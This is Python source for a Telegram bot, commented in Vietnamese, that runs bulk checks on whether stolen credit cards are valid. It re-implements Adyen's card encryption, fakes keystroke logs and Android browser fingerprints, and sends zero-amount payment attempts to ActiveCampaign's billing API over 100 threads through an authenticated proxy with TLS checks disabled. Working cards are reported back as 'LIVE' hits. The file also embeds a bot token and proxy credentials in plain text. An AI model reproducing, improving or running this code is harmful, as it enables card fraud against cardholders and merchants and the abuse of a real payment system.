import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
from datetime import datetime
import io
import threading
import queue

# Thư viện Bot Telegram & Hệ thống
import telebot
import psutil 
from telebot import types

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request (PycURL)
import pycurl

# ===================================================================
# === CẤU HÌNH BOT TELEGRAM
# ===================================================================
API_TOKEN = '8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I'  # <--- THAY TOKEN CỦA BẠN VÀO ĐÂY
bot = telebot.TeleBot(API_TOKEN)

# Biến toàn cục để quản lý trạng thái
user_tasks = {} # Lưu trạng thái task của từng user

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    """Kiểm tra thuật toán Luhn cho số thẻ."""
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'


# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180)
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e: return bytearray(0)
    if len(e) % 2 == 1: e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA", "kid": "asf-key", "e": encoded_part1, "n": encoded_part2, "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)

        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        
        aes_key = cek[32:]
        hmac_key = cek[:32]
        
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)

        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]

        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details or Adyen key")

    if not stripe_key: stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain: domain = "https://www.mytheresa.com"
        
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    
    card_number = format_card_number(card)
    fake_number_log = generate_fake_log(16)
    fake_cvc_log = generate_fake_log(3)

    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", 
            "activate": "3", "referrer": referrer, "numberFieldFocusCount": "1", "numberFieldLog": fake_number_log, 
            "numberFieldClickCount": "1", "numberFieldKeyCount": "16"
        },
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {
            "cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", 
            "referrer": referrer, "cvcFieldFocusCount": "1", "cvcFieldLog": fake_cvc_log, 
            "cvcFieldClickCount": "1", "cvcFieldKeyCount": "3", "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", "deactivate": "2"
        }
    }

    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
        
    return encrypted_details

# ===================================================================
# === PHẦN 3: GENERATE OKHTTP PROFILE
# ===================================================================

def generate_random_model_string():
    def random_digits(n): return ''.join(random.choices(string.digits, k=n))
    def random_chars(n): return ''.join(random.choices(string.ascii_uppercase, k=n))

    patterns = [
        lambda: f"SM-G9{random.choice(['9', '8', '7', '6'])}{random.choice(['1', '6', '8', '0'])}{random.choice(['B', 'F', 'N', 'U', 'W'])}",
        lambda: f"SM-S9{random.randint(0, 2)}{random.choice(['1', '6', '8'])}{random.choice(['B', 'E', 'N', '0'])}",
        lambda: f"SM-A{random.randint(10, 73)}{random.randint(5, 7)}{random.choice(['F', 'M', 'B'])}",
        lambda: f"{random.randint(20, 24)}0{random.randint(1, 9)}{random_digits(3)}{random.choice(['G', 'C', 'I'])}", 
        lambda: f"CPH{random.randint(1900, 2600)}",
        lambda: f"V{random.randint(2000, 2350)}",
        lambda: f"Pixel {random.randint(4, 9)}{random.choice(['', ' Pro', 'a', ' XL'])}"
    ]
    return random.choice(patterns)()

def generate_okhttp_profile():
    okhttp_ids = ["okhttp4_android_4", "okhttp4_android_5", "okhttp4_android_6"]
    selected_id = random.choice(okhttp_ids)
    android_ver = selected_id.split('_')[-1]
    model = generate_random_model_string()
    
    major_ver = random.randint(90, 120)
    build_ver = random.randint(4000, 6000)
    patch_ver = random.randint(50, 200)
    chrome_ver = f"{major_ver}.0.{build_ver}.{patch_ver}"
    
    user_agent = f"Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
    return {"client_identifier": selected_id, "user_agent": user_agent}

# ===================================================================
# === PHẦN 4: HÀM CHECK THẺ (CORE LOGIC) - ĐÃ CẬP NHẬT
# ===================================================================

def check_card_core(line_card):
    """
    Hàm xử lý logic check thẻ, trả về tuple (status, message, result_string)
    """
    line_card = line_card.strip()
    normalized = normalize_card(line_card)
    
    if not normalized:
        return "ERROR", "Format Error", f"{line_card}|N/A|N/A|N/A|N/A|N/A|Format Error"

    cc, mm, yyyy, cvc = normalized.split('|')

    if not validate_luhn(cc):
        return "ERROR", "Luhn Error", f"{cc}|{mm}|{yyyy}|{cvc}|N/A|N/A|N/A|N/A|Luhn Error"

    # Cấu hình API Key
    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    data = {}
    success_request = False
    max_retries = 3
    current_try = 0
    
    # Retry Loop
    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )

            profile = generate_okhttp_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = ''.join(random.choices(string.ascii_letters + ' ', k=10))
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10))

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: vi-VN,vi;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                'origin: https://www.activecampaign.com',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': '13cb7ddc-d547-4243-9ae7-db383f27b7e31768731017809D9F2B239CAAA395BD17EB4E018DECAB476BC83B3833879AB0F584D9F1EC894A0',
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': ''},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')

            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            # Proxy Configuration (Giữ nguyên)
            proxy_url = "http://aus.360s5.com:3600"
            proxy_auth = "88634867-zone-custom-region-JP:AetOKcLB"
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)

            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')

            try:
                data = json.loads(response_text)
                success_request = True
                break
            except json.JSONDecodeError:
                pass

        except Exception as e:
            pass
        
        current_try += 1
        time.sleep(1)

    if not success_request:
        return "ERROR", "Network Fail", f"{cc}|{mm}|{yyyy}|{cvc}|N/A|N/A|N/A|N/A|N/A|N/A|Network Fail"

    # Trích xuất dữ liệu đầy đủ theo yêu cầu
    additionalData = data.get('additionalData', {})
    
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', refusalReasonRaw)
    
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    # Xác định trạng thái và Msg hiển thị cuối
    final_msg = message
    if resultCode == "Authorised" or resultCode == "Cancelled":
        status_main = "LIVE"
        short_msg = "APPROVED ✅"
        final_msg = "APPROVED"
    elif resultCode == "Refused":
        status_main = "DIE"
        short_msg = f"Refused - {refusalReason}"
        final_msg = refusalReason if refusalReason != 'N/A' else message
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        status_main = "DIE"
        short_msg = "3DS Required"
        final_msg = "3D Secure"
    else:
        status_main = "DIE"
        short_msg = f"UNK - {message}"

    # ĐỊNH DẠNG CHUỖI KẾT QUẢ ĐẦY ĐỦ:
    # {cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}
    full_resp = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{final_msg}"

    return status_main, short_msg, full_resp

# ===================================================================
# === PHẦN 5: BOT LOGIC & MULTI-THREADING (ĐÃ NÂNG LÊN 100 LUỒNG)
# ===================================================================

class UserStats:
    def __init__(self):
        self.total = 0
        self.live = 0
        self.die = 0
        self.error = 0
        self.processed = 0
        self.start_time = time.time()
        self.is_running = False
        self.message_id = None
        self.chat_id = None
        self.filename = ""

def worker_bot(q, stats):
    while True:
        try:
            card = q.get(timeout=2)
        except queue.Empty:
            break
            
        if card is None:
            break
            
        status, msg, raw_res = check_card_core(card)
        
        # Cập nhật thống kê
        stats.processed += 1
        if status == "LIVE":
            stats.live += 1
            # Gửi tin nhắn Live riêng (Format đầy đủ)
            try:
                bot.send_message(stats.chat_id, f"✅ <b>LIVE - APPROVED</b> ✅\n<code>{raw_res}</code>", parse_mode='HTML')
            except: pass
            
            # Lưu file local (Format đầy đủ)
            with open(f"live_{stats.chat_id}.txt", "a") as f:
                f.write(raw_res + "\n")
                
        elif status == "DIE":
            stats.die += 1
        else:
            stats.error += 1
            
        q.task_done()

def update_dashboard(chat_id, stats):
    """Luồng riêng để update tin nhắn thống kê"""
    while stats.is_running and stats.processed < stats.total:
        time.sleep(1) # Update mỗi 3.5s
        
        elapsed = time.time() - stats.start_time
        if elapsed == 0: elapsed = 1
        cpm = int((stats.processed / elapsed) * 60)
        
        cpu_usage = psutil.cpu_percent()
        ram_usage = psutil.virtual_memory().percent
        
        text = (
            f"<b>⚡ GATEWAY ADYEN CHECKER (100 THREADS) ⚡</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📂 File: <b>{stats.filename}</b>\n"
            f"✅ Live: <b>{stats.live}</b>\n"
            f"❌ Die: <b>{stats.die}</b>\n"
            f"⚠️ Error: <b>{stats.error}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔄 Total: <b>{stats.processed}/{stats.total}</b>\n"
            f"🚀 CPM: <b>{cpm}</b>\n"
            f"🖥 CPU: {cpu_usage}% | RAM: {ram_usage}%\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Checking..."
        )
        
        try:
            bot.edit_message_text(text, chat_id=chat_id, message_id=stats.message_id, parse_mode='HTML')
        except Exception as e:
            pass

    # Update lần cuối khi xong
    text_done = (
            f"<b>✅ CHECK HOÀN TẤT</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📂 File: <b>{stats.filename}</b>\n"
            f"✅ Live: <b>{stats.live}</b>\n"
            f"❌ Die: <b>{stats.die}</b>\n"
            f"⚠️ Error: <b>{stats.error}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔄 Total: <b>{stats.processed}/{stats.total}</b>\n"
    )
    try:
        bot.edit_message_text(text_done, chat_id=chat_id, message_id=stats.message_id, parse_mode='HTML')
        # Gửi file kết quả nếu có live
        if os.path.exists(f"live_{chat_id}.txt"):
            with open(f"live_{chat_id}.txt", "rb") as f:
                bot.send_document(chat_id, f, caption="File Live Hits (Full Format)")
            os.remove(f"live_{chat_id}.txt")
    except: pass

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, 
                 "👋 Chào mừng!\n\n"
                 "1. Gửi file <code>.txt</code> chứa thẻ để check Bulk (100 Threads).\n"
                 "2. Dùng lệnh <code>/st cc|mm|yy|cvv</code> để check lẻ.",
                 parse_mode='HTML')

@bot.message_handler(commands=['st'])
def check_single_card(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Vui lòng nhập thẻ. Ví dụ: <code>/st 445566|12|24|111</code>", parse_mode='HTML')
            return
        
        card_raw = parts[1]
        msg_wait = bot.reply_to(message, "🔄 Đang check...")
        
        status, short_msg, full_res = check_card_core(card_raw)
        
        if status == "LIVE":
            icon = "✅"
            header = "LIVE - APPROVED ✅"
        elif status == "DIE":
            icon = "❌"
            header = "DIE"
        else:
            icon = "⚠️"
            header = "ERROR"
            
        resp_text = f"{icon} <b>{header}</b>\n<code>{full_res}</code>"
        bot.edit_message_text(resp_text, chat_id=message.chat.id, message_id=msg_wait.message_id, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Lỗi hệ thống: {e}")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        chat_id = message.chat.id
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Lưu tạm file
        temp_filename = f"temp_{chat_id}.txt"
        with open(temp_filename, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        # Đọc thẻ
        with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        os.remove(temp_filename)
        
        if not cards:
            bot.reply_to(message, "⚠️ File trống hoặc không đọc được.")
            return

        # Khởi tạo Stats
        stats = UserStats()
        stats.total = len(cards)
        stats.chat_id = chat_id
        stats.filename = message.document.file_name
        stats.is_running = True
        
        # Gửi bảng Dashboard ban đầu
        sent_msg = bot.send_message(chat_id, 
                                    f"🚀 Đang chuẩn bị chạy {len(cards)} thẻ với 100 luồng...", 
                                    parse_mode='HTML')
        stats.message_id = sent_msg.message_id
        
        user_tasks[chat_id] = stats
        
        # Setup Queue & Threads
        q = queue.Queue()
        for c in cards:
            q.put(c)
            
        # Chạy 100 luồng theo yêu cầu
        num_threads = 100
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=worker_bot, args=(q, stats))
            t.start()
            threads.append(t)
            
        # Chạy luồng cập nhật Dashboard
        monitor_t = threading.Thread(target=update_dashboard, args=(chat_id, stats))
        monitor_t.start()
        
    except Exception as e:
        bot.reply_to(message, f"Lỗi xử lý file: {e}")

# ===================================================================
# === MAIN LOOP
# ===================================================================
if __name__ == '__main__':
    print("Bot đang chạy...")
    bot.infinity_polling()
